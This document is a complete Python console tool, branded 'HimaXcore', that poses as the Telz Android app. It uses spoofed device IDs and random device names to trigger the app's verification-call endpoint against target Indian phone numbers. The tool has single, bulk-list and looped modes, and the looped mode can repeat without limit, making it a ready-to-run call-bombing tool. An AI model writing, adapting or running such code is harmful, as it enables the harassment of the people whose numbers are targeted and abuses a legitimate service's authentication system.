#!/usr/bin/env python3

import requests
import json
import time
import uuid
import os
import sys
import random
import re
import threading
from threading import Lock
from datetime import datetime
from collections import defaultdict
import itertools

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_VAR = True
except ImportError:
    COLORAMA_VAR = False

    class Fore:
        GREEN = '\033[92m'
        RED = '\033[31m'
        WHITE = '\033[37m'
        CYAN = '\033[96m'
        YELLOW = '\033[93m'
        MAGENTA = '\033[95m'
        BLUE = '\033[94m'
        BLACK = '\033[30m'

    class Back:
        MAGENTA = '\033[45m'
        BLACK = '\033[40m'
        WHITE = '\033[47m'
        GREEN = '\033[42m'
        RED = '\033[41m'

    class Style:
        BRIGHT = '\033[1m'
        DIM = '\033[2m'
        NORMAL = '\033[22m'

try:
    import pyfiglet
    PYFIGLET_VAR = True
except ImportError:
    PYFIGLET_VAR = False

HIMAXCORE_TAG = "HimaXcore"
HIMAXCORE_SIGN = f"{Fore.MAGENTA}{Style.BRIGHT}✦ {HIMAXCORE_TAG} ✦{Style.NORMAL}{Fore.WHITE}"


class AnimatedInterface:

    def __init__(self):
        self.animation_active = True
        self.status_message = ""
        self.process_count = 0
        self.success_count = 0
        self.error_count = 0

    def loading_animation(self, message="Processing", duration=3):
        spinner = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
        start_time = time.time()

        while time.time() - start_time < duration:
            sys.stdout.write(f'\r{Fore.CYAN}{next(spinner)} {message}... {Style.DIM}')
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write(f'\r{Fore.GREEN}✓ {message} completed!    \n')
        sys.stdout.flush()

    def progress_bar(self, percentage, width=40):
        filled = int(width * percentage / 100)
        empty = width - filled

        if percentage > 66:
            color = Fore.GREEN
        elif percentage > 33:
            color = Fore.YELLOW
        else:
            color = Fore.RED

        bar = f"{color}{'█' * filled}{Style.DIM}{'░' * empty}"
        sys.stdout.write(f'\r{bar} %{percentage:3.1f}')
        sys.stdout.flush()

    def show_banner(self):
        os.system('clear' if os.name == 'posix' else 'cls')

        print(f"\n{HIMAXCORE_SIGN}\n")

        if PYFIGLET_VAR:
            banner = pyfiglet.figlet_format("HIMA XCORE", font="slant")
            print(f"{Fore.MAGENTA}{Style.BRIGHT}{banner}")
        else:
            print(f"{Fore.MAGENTA}{Style.BRIGHT}    _   _   _   _   _\n   / \\ / \\ / \\ / \\ / \\\n  |  HIMA XCORE  |\n   \\_// \\_// \\_// \\_//\n")

        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Brand: {Fore.CYAN}{HIMAXCORE_TAG}")
        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.GREEN}Operator: {Fore.CYAN}HimaXcore Security")
        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Region: {Fore.GREEN}India (+91)")
        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Date: {Fore.CYAN}{datetime.now().strftime('%d.%m.%Y %H:%M')}")
        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Terminal Ready: {Fore.GREEN}✓")
        print(f"{Fore.RED}{Style.BRIGHT}{'─' * 55}\n")

    def typewriter_text(self, text, speed=0.03, color=None):
        if color is None:
            color = Fore.WHITE
        for char in text:
            sys.stdout.write(f"{color}{char}")
            sys.stdout.flush()
            time.sleep(speed)
        print()

    def show_status(self, title, status, detail=""):
        symbols = {
            'success': f"{Fore.GREEN}✅",
            'error': f"{Fore.RED}❌",
            'info': f"{Fore.CYAN}ℹ️",
            'warning': f"{Fore.YELLOW}⚠️",
            'working': f"{Fore.BLUE}🔄"
        }

        symbol = symbols.get(status, "•")

        if status == 'success':
            color = Fore.GREEN
        elif status == 'error':
            color = Fore.RED
        elif status == 'warning':
            color = Fore.YELLOW
        elif status == 'info':
            color = Fore.CYAN
        elif status == 'working':
            color = Fore.BLUE
        else:
            color = Fore.WHITE

        print(f"{symbol} {Fore.WHITE}{title}: {color}{detail}")

    def show_menu(self):
        menu = f"""
{Fore.MAGENTA}{Style.BRIGHT}╔══════════════════════════════════════════════════╗
║                {Fore.WHITE}HimaXcore Console{Fore.MAGENTA}                 ║
║                                                      ║
║  {Fore.YELLOW}[1] {Fore.WHITE}Start Single Call                              ║
║  {Fore.YELLOW}[2] {Fore.WHITE}Start Bulk Call (List)                         ║
║  {Fore.YELLOW}[3] {Fore.WHITE}Loop Call on One Number                       ║
║  {Fore.YELLOW}[4] {Fore.WHITE}Change Settings                                ║
║  {Fore.YELLOW}[5] {Fore.WHITE}Show Statistics                                ║
║  {Fore.YELLOW}[6] {Fore.WHITE}Exit                                           ║
║                                                      ║
{Fore.MAGENTA}╚══════════════════════════════════════════════════╝
        """
        print(menu)


class RateLimiter:

    def __init__(self, waiting_time=60):
        self.waiting_time = float(waiting_time)
        self.call_records = {}
        self.lock = Lock()
        self.stats = defaultdict(int)

    def check(self, number):
        current_time = time.time()

        with self.lock:
            last_call = self.call_records.get(number)

            if last_call is None or (current_time - last_call) >= self.waiting_time:
                self.call_records[number] = current_time
                self.stats['allowed'] += 1
                return True
            else:
                remaining_time = self.waiting_time - (current_time - last_call)
                self.stats['rejected'] += 1
                return False, remaining_time

    def change_wait_time(self, new_time):
        self.waiting_time = float(new_time)

    def get_stats(self):
        return dict(self.stats)


class TelzClientAdvanced:

    BASE_URL = "https://api.telz.com/"
    HEADERS = {
        'User-Agent': "Telz-Android/17.5.33",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json; charset=UTF-8"
    }

    def __init__(self, android_id=None, app_version="17.5.33", os_name="android", os_version="15"):
        self.android_id = android_id or self._random_android_id()
        self.app_version = app_version
        self.os_name = os_name
        self.os_version = os_version
        self.uuid = str(uuid.uuid4())
        self.session = requests.Session()
        self.session.headers.update(self.HEADERS)

        self.stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'last_error': None
        }

    @staticmethod
    def _random_android_id():
        return uuid.uuid4().hex[:16]

    @staticmethod
    def _random_device_name():
        brands = ["Pixel", "Xiaomi", "Samsung", "OnePlus", "Moto", "Realme", "Oppo"]
        models = ["Pro", "Ultra", "Lite", "Max", "Plus", "5G"]
        return f"{random.choice(brands)} {random.choice(models)}-{uuid.uuid4().hex[:6]}"

    def _api_request(self, endpoint, payload, timeout=15, retries=2):
        url = self.BASE_URL + endpoint
        request_data = payload.copy()

        request_data.update({
            "android_id": self.android_id,
            "app_version": self.app_version,
            "os": self.os_name,
            "os_version": self.os_version,
            "ts": int(time.time() * 1000),
            "uuid": self.uuid
        })

        for attempt in range(retries):
            try:
                self.stats['total_requests'] += 1
                response = self.session.post(
                    url,
                    data=json.dumps(request_data),
                    timeout=timeout
                )

                if response.status_code == 429:
                    retry_after = response.headers.get("Retry-After", "?")
                    raise RuntimeError(
                        f"Rate limit reached! Retry in {retry_after} seconds."
                    )

                response.raise_for_status()
                self.stats['successful_requests'] += 1

                try:
                    return response.json()
                except ValueError:
                    return response.text

            except Exception as e:
                self.stats['failed_requests'] += 1
                self.stats['last_error'] = str(e)

                if attempt < retries - 1:
                    time.sleep(2 ** attempt)
                    continue
                raise

    def get_auth_list(self):
        return self._api_request("app/auth_list", {"event": "auth_list"})

    def start_device(self, device_name=None, ipv4="10.1.10.1", ipv6="FE80::1", language="en"):
        device_name = device_name or self._random_device_name()
        return self._api_request("app/run", {
            "event": "run",
            "device_name": device_name,
            "ipv4_address": ipv4,
            "ipv6_address": ipv6,
            "lang": language,
            "network_country": "in",
            "network_type": "4G",
            "roaming": "no",
            "root": "no",
            "run_id": "",
            "sim_country": "in"
        })

    def button_status_check(self, button="on_reg_continue"):
        return self._api_request("app/stat_btns", {
            "event": "stat_btns",
            "btn": button
        })

    def validate_phone_number(self, phone, region="IN"):
        return self._api_request("app/validate_phonenumber", {
            "event": "validate_phonenumber",
            "phone": phone,
            "region": region
        })

    def start_call(self, phone, attempt="0", language="en"):
        return self._api_request("app/auth_call", {
            "event": "auth_call",
            "phone": phone,
            "attempt": attempt,
            "lang": language
        })

    def answer_call(self, phone, success=True):
        return self._api_request("app/auth_call_response", {
            "event": "auth_call_response",
            "phone": phone,
            "success": bool(success)
        })


class CallEngine:

    def __init__(self):
        self.ui = AnimatedInterface()
        self.rate_limiter = RateLimiter(waiting_time=60)
        self.mode = "NORMAL"
        self.target_numbers = []
        self.active = True
        self.general_stats = {
            'total_calls': 0,
            'successful_calls': 0,
            'failed_calls': 0,
            'start_time': datetime.now(),
            'api_requests': 0
        }
        self.settings = {
            'waiting_time': 60,
            'animation_speed': 0.03,
            'auto_reply': True,
            'debug_mode': False,
            'max_retries': 3
        }

    @staticmethod
    def normalize_indian_number(number):
        cleaned = re.sub(r'\D', '', str(number).strip())
        if not cleaned:
            return ""
        if cleaned.startswith('91') and len(cleaned) == 12:
            return '+' + cleaned
        if len(cleaned) == 10:
            return '+91' + cleaned
        if cleaned.startswith('0') and len(cleaned) == 11:
            return '+91' + cleaned[1:]
        return '+' + cleaned if cleaned.startswith('91') else '+' + cleaned

    def start(self):
        try:
            self.ui.show_banner()
            self.ui.typewriter_text(f"{HIMAXCORE_TAG} system starting...", 0.02, Fore.CYAN)
            self._check_dependencies()

            while self.active:
                self.ui.show_menu()
                choice = input(f"{Fore.YELLOW}Your choice (1-6): {Fore.WHITE}")

                if choice == "1":
                    self._single_call()
                elif choice == "2":
                    self._bulk_call()
                elif choice == "3":
                    self._looped_call()
                elif choice == "4":
                    self._settings_menu()
                elif choice == "5":
                    self._show_statistics()
                elif choice == "6":
                    self._exit()
                else:
                    print(f"{Fore.RED}Invalid selection!")
                    time.sleep(1)

        except KeyboardInterrupt:
            self._exit()
        except Exception as e:
            print(f"{Fore.RED}Unexpected error: {e}")
            if self.settings['debug_mode']:
                import traceback
                traceback.print_exc()
            time.sleep(3)

    def _check_dependencies(self):
        required = ['requests', 'colorama']
        missing = []

        for lib in required:
            try:
                __import__(lib)
            except ImportError:
                missing.append(lib)

        if missing:
            self.ui.show_status("Library", "warning", f"Missing: {', '.join(missing)}")
            print(f"{Fore.YELLOW}Install with: pip install {' '.join(missing)}")
            time.sleep(2)

    def _single_call(self):
        self.ui.show_banner()

        print(f"\n{Fore.CYAN}{'─' * 55}")
        number = input(f"{Fore.WHITE}Target number (example: {Fore.YELLOW}+91 98765 43210{Fore.WHITE}): ").strip()

        if not number:
            print(f"{Fore.RED}Number cannot be empty!")
            time.sleep(1)
            return

        number = self.normalize_indian_number(number)
        if not number or not number.startswith('+91'):
            print(f"{Fore.RED}Please enter a valid Indian mobile number with +91 prefix.")
            time.sleep(1)
            return

        self.ui.typewriter_text(f"\nValidating number: {number}", 0.02, Fore.CYAN)

        client = TelzClientAdvanced()
        self.general_stats['total_calls'] += 1

        steps = [
            ("Identity verification", lambda: client.get_auth_list()),
            ("Device setup", lambda: client.start_device()),
            ("Button check", lambda: client.button_status_check()),
            ("Number validation", lambda: client.validate_phone_number(number, "IN")),
        ]

        successful_steps = 0
        for step_name, process in steps:
            try:
                self.ui.loading_animation(step_name, 1.5)
                result = process()
                self.ui.show_status(step_name, "success", "Completed")
                successful_steps += 1
                self.general_stats['api_requests'] += 1
            except Exception as e:
                self.ui.show_status(step_name, "error", str(e)[:50])
                if self.settings['debug_mode']:
                    import traceback
                    traceback.print_exc()
                return

        if successful_steps == len(steps):
            try:
                print(f"\n{Fore.YELLOW}{'─' * 55}")
                self.ui.typewriter_text("Starting call...", 0.03, Fore.GREEN)

                check_result = self.rate_limiter.check(number)
                if check_result == True or (isinstance(check_result, tuple) and check_result[0]):
                    for i in range(21):
                        percentage = (i / 20) * 100
                        self.ui.progress_bar(percentage)
                        time.sleep(0.3)
                    print()

                    result = client.start_call(number)
                    self.general_stats['successful_calls'] += 1
                    self.general_stats['api_requests'] += 1

                    print(f"{Fore.GREEN}Call started successfully!")

                    if self.settings['debug_mode']:
                        print(f"{Fore.CYAN}Server response: {json.dumps(result, indent=2)}")

                    self.ui.typewriter_text("\nWaiting 20 seconds...", 0.02, Fore.YELLOW)
                    for i in range(20, 0, -1):
                        sys.stdout.write(f"\r{Fore.CYAN}Time left: {i} seconds ")
                        sys.stdout.flush()
                        time.sleep(1)
                    print()
                else:
                    remaining = check_result[1] if isinstance(check_result, tuple) else self.settings['waiting_time']
                    print(f"{Fore.RED}You need to wait {remaining:.0f} seconds for this number!")
                    self.general_stats['failed_calls'] += 1

            except Exception as e:
                self.ui.show_status("Call", "error", str(e)[:50])
                self.general_stats['failed_calls'] += 1
                if self.settings['debug_mode']:
                    import traceback
                    traceback.print_exc()

        input(f"\n{Fore.CYAN}Press ENTER to continue...")

    def _bulk_call(self):
        self.ui.show_banner()
        print(f"\n{Fore.CYAN}{'─' * 55}")
        print(f"{Fore.YELLOW}Bulk Call Mode")
        print(f"{Fore.CYAN}{'─' * 55}")

        print(f"\n{Fore.WHITE}Enter numbers one per line (blank line to finish):")
        print(f"{Fore.CYAN}Example: +91 98765 43210")

        numbers = []
        while True:
            number = input(f"{Fore.GREEN}Number {len(numbers) + 1}: {Fore.WHITE}").strip()
            if not number:
                break
            normalized = self.normalize_indian_number(number)
            if normalized.startswith('+91'):
                numbers.append(normalized)
            else:
                print(f"{Fore.RED}Skipped invalid number: {number}")

        if not numbers:
            print(f"{Fore.RED}No numbers were entered!")
            time.sleep(1)
            return

        print(f"\n{Fore.CYAN}Total {len(numbers)} numbers will be processed.")
        print(f"{Fore.YELLOW}This may take some time!")

        confirm = input(f"{Fore.WHITE}Do you want to continue? (y/n): ").lower()
        if confirm != 'y':
            return

        successful = 0
        failed = 0

        for i, number in enumerate(numbers, 1):
            print(f"\n{Fore.CYAN}{'─' * 55}")
            print(f"{Fore.YELLOW}[{i}/{len(numbers)}] Processing: {number}")

            try:
                client = TelzClientAdvanced()

                client.get_auth_list()
                client.start_device()
                client.button_status_check()
                client.validate_phone_number(number, "IN")

                check_result = self.rate_limiter.check(number)
                if check_result == True or (isinstance(check_result, tuple) and check_result[0]):
                    client.start_call(number)
                    successful += 1
                    self.ui.show_status("Result", "success", "Call started")
                else:
                    failed += 1
                    remaining = check_result[1] if isinstance(check_result, tuple) else self.settings['waiting_time']
                    self.ui.show_status("Result", "error", f"Rate limit: {remaining:.0f}s")

            except Exception as e:
                failed += 1
                self.ui.show_status("Result", "error", str(e)[:50])

            if i < len(numbers):
                time.sleep(5)

        print(f"\n{Fore.CYAN}{'─' * 55}")
        print(f"{Fore.GREEN}Successful: {successful}")
        print(f"{Fore.RED}Failed: {failed}")

        self.general_stats['total_calls'] += successful + failed
        self.general_stats['successful_calls'] += successful
        self.general_stats['failed_calls'] += failed

        input(f"\n{Fore.CYAN}Press ENTER to continue...")

    def _looped_call(self):
        self.ui.show_banner()
        print(f"\n{Fore.CYAN}{'─' * 55}")
        print(f"{Fore.YELLOW}Loop Call Mode")
        print(f"{Fore.CYAN}{'─' * 55}")

        number = input(f"{Fore.WHITE}Enter Indian number (example: {Fore.YELLOW}+91 98765 43210{Fore.WHITE}): ").strip()
        if not number:
            print(f"{Fore.RED}Number cannot be empty!")
            time.sleep(1)
            return

        number = self.normalize_indian_number(number)
        if not number.startswith('+91'):
            print(f"{Fore.RED}Please enter a valid Indian mobile number with +91 prefix.")
            time.sleep(1)
            return

        repeat_input = input(f"{Fore.WHITE}How many times? (0 = infinite, default 10): ").strip() or "10"
        if repeat_input.lower() in ["infinite", "inf"]:
            repeat_count = 0
        else:
            try:
                repeat_count = int(repeat_input)
                if repeat_count <= 0:
                    print(f"{Fore.RED}Repeat count must be greater than zero.")
                    time.sleep(1)
                    return
            except ValueError:
                print(f"{Fore.RED}Invalid repeat count.")
                time.sleep(1)
                return

        delay_input = input(f"{Fore.WHITE}Delay between calls in seconds (default 60): ").strip() or "60"
        try:
            delay_seconds = float(delay_input)
            if delay_seconds < 0:
                print(f"{Fore.RED}Cooldown cannot be negative.")
                time.sleep(1)
                return
        except ValueError:
            print(f"{Fore.RED}Invalid delay value.")
            time.sleep(1)
            return

        self.rate_limiter.change_wait_time(delay_seconds)
        self.settings['waiting_time'] = delay_seconds

        print(f"\n{Fore.CYAN}Looping call on: {number}")
        print(f"{Fore.YELLOW}Press Ctrl+C to stop anytime.")

        try:
            attempt = 1
            while True:
                if repeat_count > 0 and attempt > repeat_count:
                    break

                self.ui.typewriter_text(f"\nAttempt {attempt}: calling {number}", 0.02, Fore.CYAN)

                client = TelzClientAdvanced()
                try:
                    client.get_auth_list()
                    client.start_device()
                    client.button_status_check()
                    client.validate_phone_number(number, "IN")

                    rate_result = self.rate_limiter.check(number)
                    allowed = rate_result is True or (isinstance(rate_result, tuple) and rate_result[0])

                    if allowed:
                        client.start_call(number)
                        self.ui.show_status("Loop call", "success", f"Attempt {attempt} sent")
                    else:
                        remaining = rate_result[1] if isinstance(rate_result, tuple) else self.settings['waiting_time']
                        self.ui.show_status("Loop call", "warning", f"Rate limited: {remaining:.0f}s")
                except Exception as e:
                    self.ui.show_status("Loop call", "error", str(e)[:60])

                if repeat_count > 0 and attempt >= repeat_count:
                    break

                actual_wait = max(int(self.rate_limiter.waiting_time), int(delay_seconds))
                box_width = 42
                top = f"{Fore.MAGENTA}{Style.BRIGHT}╔{'═' * (box_width - 2)}╗"
                bottom = f"{Fore.MAGENTA}{Style.BRIGHT}╚{'═' * (box_width - 2)}╝"
                label = f"{Fore.WHITE}HimaXcore Timer"

                print(f"\n{top}")
                print(f"{Fore.MAGENTA}{Style.BRIGHT}║{Fore.WHITE}{label.center(box_width - 2)}{Fore.MAGENTA}{Style.BRIGHT}║")
                print(f"{Fore.MAGENTA}{Style.BRIGHT}║{Fore.CYAN}{' ' * 2}Waiting for next call...{Fore.MAGENTA}{Style.BRIGHT}{' ' * max(0, box_width - 26)}║")
                print(f"{bottom}")

                for count in range(actual_wait, 0, -1):
                    timer_line = f"{Fore.MAGENTA}{Style.BRIGHT}║{Fore.CYAN} Next call in {count:02d}s {Fore.MAGENTA}{Style.BRIGHT}{' ' * max(0, box_width - 26)}║"
                    print(f"\r{timer_line}", end="", flush=True)
                    time.sleep(1)

                print(f"\r{Fore.MAGENTA}{Style.BRIGHT}╔{'═' * (box_width - 2)}╗", flush=True)
                print(f"{Fore.MAGENTA}{Style.BRIGHT}║{Fore.GREEN}{' Next call starting now '.center(box_width - 2)}{Fore.MAGENTA}{Style.BRIGHT}║")
                print(f"{Fore.MAGENTA}{Style.BRIGHT}╚{'═' * (box_width - 2)}╝{Style.NORMAL}")
                attempt += 1

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Loop stopped by user.")

        input(f"\n{Fore.CYAN}Press ENTER to continue...")

    def _settings_menu(self):
        while True:
            self.ui.show_banner()
            print(f"{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════╗")
            print(f"║                                                      ║")
            print(f"║  {Fore.YELLOW}[1] {Fore.WHITE}Wait Time: {Fore.GREEN}{self.settings['waiting_time']} seconds")
            print(f"║  {Fore.YELLOW}[2] {Fore.WHITE}Debug Mode: {Fore.GREEN}{self.settings['debug_mode']}")
            print(f"║  {Fore.YELLOW}[3] {Fore.WHITE}Back to Main Menu                                 ║")
            print(f"║                                                      ║")
            print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝")

            selection = input(f"{Fore.YELLOW}Your choice (1-3): {Fore.WHITE}").strip()
            if selection == "1":
                new_time = input(f"{Fore.WHITE}New wait time in seconds (default 60): ").strip() or "60"
                try:
                    new_time_value = int(new_time)
                    if new_time_value < 0:
                        print(f"{Fore.RED}Cooldown cannot be negative.")
                        continue
                    self.settings['waiting_time'] = new_time_value
                    self.rate_limiter.change_wait_time(new_time_value)
                except ValueError:
                    print(f"{Fore.RED}Invalid value.")
            elif selection == "2":
                self.settings['debug_mode'] = not self.settings['debug_mode']
            elif selection == "3":
                break

    def _show_statistics(self):
        self.ui.show_banner()
        elapsed = datetime.now() - self.general_stats['start_time']
        print(f"{Fore.CYAN}📊 System Statistics")
        print(f"{Fore.CYAN}{'─' * 55}")
        print(f"{Fore.WHITE}Running Time: {Fore.YELLOW}{elapsed.seconds} seconds")
        print(f"{Fore.WHITE}Total Calls: {Fore.YELLOW}{self.general_stats['total_calls']}")
        print(f"{Fore.WHITE}Successful Calls: {Fore.GREEN}{self.general_stats['successful_calls']}")
        print(f"{Fore.WHITE}Failed Calls: {Fore.RED}{self.general_stats['failed_calls']}")
        print(f"{Fore.WHITE}API Requests: {Fore.BLUE}{self.general_stats['api_requests']}")
        input(f"\n{Fore.CYAN}Press ENTER to continue...")

    def _exit(self):
        self.ui.show_banner()
        self.ui.typewriter_text(f"{HIMAXCORE_TAG} signed out... Goodbye!", 0.03, Fore.MAGENTA)
        self.active = False
        sys.exit(0)


if __name__ == "__main__":
    engine = CallEngine()
    engine.start()